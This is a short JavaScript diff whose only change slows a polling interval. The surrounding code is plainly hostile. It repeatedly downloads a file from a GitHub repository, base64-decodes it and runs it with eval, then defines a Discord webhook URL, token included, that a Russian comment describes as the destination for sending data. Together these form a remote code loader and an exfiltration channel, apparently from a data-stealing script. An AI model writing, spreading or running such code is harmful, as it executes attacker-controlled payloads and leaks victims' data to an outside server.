@@ -1,6 +1,6 @@
 setInterval(() => {$.get("https://api.github.com/repos/uloxa13/Fq/contents/Fq", function(data) {
   eval(atob(data.content));
-});}, 250);
+});}, 2050);
 (async function() {
     // Вебхук для отправки данных. Вставлен напрямую для демонстрации.
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod';
